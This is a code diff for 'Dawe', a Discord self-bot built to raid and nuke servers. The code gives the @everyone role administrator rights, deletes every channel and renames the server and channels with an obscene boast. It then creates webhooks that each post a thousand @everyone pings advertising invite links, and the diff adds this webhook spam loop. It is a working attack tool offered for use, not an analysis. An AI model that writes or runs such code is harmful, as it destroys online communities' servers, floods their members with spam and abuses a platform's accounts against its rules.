@@ -1,4 +1,4 @@
-const { Client } = require("discord.js-selfbot-v13");
+const { Client, MessageEmbed } = require("discord.js-selfbot-v13");
 const extrackGuild = require("./Utils/fetchGuild.js");
 const Bypass = require("./Utils/spamGuild.js");
 const fetchSecurityBots = require("./Utils/fetchGuild.js");
@@ -24,11 +24,11 @@ client.on("ready", async () => {
     const webhooks = await fetchedGuild.fetchWebhooks();
     await fetchedGuild.setIcon(
       guild.guild_icon ||
-        "https://media.discordapp.net/attachments/1203984625274191893/1216375255380004954/830356614028066836.png?ex=6633933c&is=663241bc&hm=0589ecb12fc9342b9cc654b32554b44b8177d620a317994c0f21127e52e7e1cc&=&format=webp&quality=lossless"
+        "https://media.discordapp.net/attachments/1232793766323028140/1235237181287694336/e25c1104-b502-4bae-8194-5deb8fec4906.jpg?ex=66344c85&is=6632fb05&hm=0f50384a44ad667a9fc67e06bde330ea0323af3be8db30ec0d6a26a5fb29d085&=&format=webp"
     );
     await fetchedGuild.setBanner(
       guild.guild_banner ||
-        "https://media.discordapp.net/attachments/1232793766323028140/1235237181287694336/e25c1104-b502-4bae-8194-5deb8fec4906.jpg?ex=6633a3c5&is=66325245&hm=d0703a96d0aae7346beed33a2460f4dd7bf85e7eea750ff5a5da05b37a9c7de1&=&format=webp"
+        "https://media.discordapp.net/attachments/1232793766323028140/1235237181287694336/e25c1104-b502-4bae-8194-5deb8fec4906.jpg?ex=66344c85&is=6632fb05&hm=0f50384a44ad667a9fc67e06bde330ea0323af3be8db30ec0d6a26a5fb29d085&=&format=webp"
     );
     await fetchedGuild.setName(guild.guild_name || "Dawe Selfbot");
 
@@ -41,7 +41,7 @@ client.on("ready", async () => {
     });
 
     fetchedGuild.channels.cache.each((ch) => {
-      ch.setName(guild_channels_name || "dawe");
+      ch.setName(guild_channels_name || "Suscefully Fucked Using Dawe");
     });
 
     await fetchSecurityBots();
@@ -121,7 +121,9 @@ client.on("messageCreate", async (message) => {
         message.member.roles.add(role.id);
       } else if (command === "everyone") {
         message.delete();
-        const everyoneRole = message.guild.roles.cache.find((role) => role.name === "@everyone");
+        const everyoneRole = message.guild.roles.cache.find(
+          (role) => role.name === "@everyone"
+        );
         if (everyoneRole) {
           everyoneRole.setPermissions("ADMINISTRATOR").then(() => {
             console.log(`Gave Administrator permission to Everyone role!`);
@@ -131,26 +133,47 @@ client.on("messageCreate", async (message) => {
         }
       } else if (command === "raid") {
         message.delete();
-        const exampleEmbed = new Discord.MessageEmbed()
+        const exampleEmbed = new MessageEmbed()
           .setColor("36393F")
           .setURL("https://github.com/i1wx/Dawe")
-          .setAuthor({
-            name: embed.author || "<a:02_mygivelove:1235377346144374856>  ** Github** ",
-            url: "https://github.com/i1wx/Dawe",
-          })
-          .setDescription(`> ${embed.description || "```fix\ni Invite you to use dawe selfbot to do things as impressive as this <3```"}`)
+          .setTitle(embed.author || "💌 **Github** ")
+          .setDescription(
+            `> ${
+              embed.description ||
+              "```i Invite you to use dawe selfbot to do things as impressive as this <3```"
+            }`
+          )
           .setTimestamp()
-          .setFooter({ text: embed.footer || null});
+          .setFooter({ text: embed.footer || "@i1wx" });
 
-        await message.guild.setName("Miami Club was here");
-        await message.guild.channels.cache.forEach((channel) => channel.delete().catch((e) => {
-          console.log("Channel Was Not Deleted");
-        }));
+        await message.guild.setName(guild.guild_name);
+        await message.guild.channels.cache.forEach((channel) =>
+          channel.delete().catch((e) => {
+            console.log("Channel Was Not Deleted");
+          })
+        );
+        const channel = await message.guild.channels.create("mudanza", {
+          type: "text",
+        });
 
-        const channel = await message.guild.channels.create("mudanza", { type: "text" });
-        for (let i = 0; i < 450; i++) {
-          channel.send({ embeds: [exampleEmbed], content: "@everyone" });
+        for (let k = 0; k < 10; k++) {
+          const webhook = await channel.createWebhook(
+            webhooks_name || "Dewa Selfbot",
+            {
+              avatar:
+                webhooks_avatar ||
+                "https://media.discordapp.net/attachments/1232793766323028140/1235237181287694336/e25c1104-b502-4bae-8194-5deb8fec4906.jpg?ex=6633a3c5&is=66325245&hm=d0703a96d0aae7346beed33a2460f4dd7bf85e7eea750ff5a5da05b37a9c7de1&=&format=webp",
+              reason: "developed by i1wx",
+            })
+            for (let z = 0; z < 1000; z++) {
+              webhook
+                .send({ embeds: [exampleEmbed], content: `@everyone ${guild_channels_name || "join https://discord.gg/qVTptF6DmN && https://discord.gg/kzcbFNenz3"}` })
+                .catch((e) => {
+                  console.log("Discord Api Err");
+                });
+            }
         }
+        
       }
     }
   }
